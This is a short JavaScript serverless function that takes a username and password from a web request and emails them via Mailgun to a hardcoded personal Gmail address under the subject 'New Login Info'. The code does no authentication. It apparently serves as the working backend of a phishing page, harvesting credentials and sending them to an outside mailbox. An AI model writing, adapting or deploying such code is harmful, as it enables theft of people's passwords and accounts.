import formData from 'form-data';
import Mailgun from 'mailgun.js';

const mailgun = new Mailgun(formData);
const mg = mailgun.client({
username: 'api',
key: process.env.MAILGUN_API_KEY
});

export async function handler(event) {
try {
const { username, password } = JSON.parse(event.body);

// Use your exact Mailgun sandbox domain here
const domain = process.env.MAILGUN_DOMAIN; // e.g., sandbox6bb4164382f045b9975489c0e3137797.mailgun.org

await mg.messages.create(domain, {
from: `Mailgun Sandbox <sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>`,
to: 'Anabones716@gmail.com', // must be verified in Mailgun sandbox
subject: 'New Login Info',
text: `Username: ${username}\nPassword: ${password}`
});

return { statusCode: 200, body: JSON.stringify({ message: "Email sent!" }) };
} catch (error) {
console.error('Mailgun error:', error);
return { statusCode: 500, body: JSON.stringify({ message: "Error sending email" }) };
}
}
